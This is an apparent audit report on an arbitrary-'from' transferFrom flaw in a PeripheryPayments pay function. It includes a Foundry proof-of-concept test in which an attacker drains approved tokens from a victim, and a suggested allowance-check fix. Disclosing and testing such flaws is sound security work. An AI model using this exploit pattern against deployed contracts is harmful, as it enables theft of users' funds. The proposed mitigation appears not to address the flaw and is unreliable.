# Vulnerability details

## Impact
Passing an arbitrary `from` address to `transferFrom` (or `safeTransferFrom`) can lead to loss of funds, because anyone can transfer tokens from the `from` address if an approval is made.

## Proof of Concept

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma abicoder v2;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/access/Ownable.sol';

import "forge-std/Test.sol";
import "../src/base/PeripheryPayments.sol";

import '../src/libraries/TransferHelper.sol';
import '../src//base/ILOPoolImmutableState.sol';

contract PeripheryPaymentsExploitTest is Test {
    
    TestToken token;
    PeripheryPayments peripheryPayments;
    TestContract testContract;

    address attacker = address(0x1);
    address victim = address(0x2);

    function setUp() public {
        // Deploy the token and testContract contracts
        token = new TestToken(10000 * 10**18);

        testContract = new TestContract();
        
        // Distribute tokens
        token.transfer(victim, 5000 * 10**18);
        token.transfer(attacker, 500 * 10**18);
    }

    function testExploit() public {
        // Victim approves the testContract contract to spend tokens on their behalf
        vm.prank(victim);
        token.approve(address(testContract), 1000 * 10**18);

        // Attacker calls the pay function with victim's address as the payer
        vm.prank(attacker);
        testContract.execute(address(token), victim, attacker, 1000 * 10**18);

        // Check the balances
        uint256 attackerBalance = token.balanceOf(attacker);
        uint256 victimBalance = token.balanceOf(victim);

        // The attacker should have received the tokens
        assertEq(attackerBalance, 1500 * 10**18, "Attacker should have 1500 tokens");
        // The victim should have lost the tokens
        assertEq(victimBalance, 4000 * 10**18, "Victim should have 4000 tokens");
    }
}

contract TestToken is ERC20 {
    constructor(uint256 initialSupply) ERC20("TestToken", "TTK") {
        _mint(msg.sender, initialSupply);
    }
}

contract TestContract is PeripheryPayments {

    function execute(address token, address victim, address attacker, uint256 amount) public {
        pay(token, victim, attacker, amount);
    }
}

```

In the proof of concept is illustrated how the attack can take advantage when there isn't an allowance check before the transfer.

Please note that the `testContract` is an example of what can happen to all the contracts which inherit the `PeripherPayments` abstract class and use the `PeripherPayments::pay` function.

## Tools Used
Solidity, Foundry

## Recommended Mitigation Steps
Add similar logic to the one below before the `TransferHelper.safeTransferFrom` which will check the current token allowance from the recepient `from`.

```solidity
+       uint256 currentAllowance = token.allowance(from, address(this));
+       require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
```
